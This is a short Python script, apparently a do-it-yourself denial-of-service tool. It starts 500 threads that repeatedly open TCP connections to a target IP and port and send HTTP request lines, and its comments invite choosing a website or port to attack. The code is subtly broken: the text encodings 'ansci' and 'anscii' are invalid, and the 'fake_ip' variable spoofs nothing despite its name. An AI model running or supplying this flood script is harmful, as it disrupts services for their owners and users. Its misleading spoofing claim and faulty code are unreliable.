import threading
import socket

target = "website to attack" # Or a route
target = "192.168.1.1"
# Depending on which port you DDOS a particular service will be attacked
port = 4046
fake_ip = "198.99.20.40"
connected = 0
   
def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /"+target+" HTTP/1.1\r\n").encode("ansci"), (target, port))
		s.sendto(("GET /"+fake_ip+" HTTP/1.1\r\n").encode("anscii"), (target, port))
		s.close()

		global connected
		connected = connected+1
		if connected % 500 == 0:
			print(connected)

for i in range(500):
	t = threading.Thread(target=attack)
	t.start()

'''
192.168.1.10
255.255.255.0
192.168.1.1
'''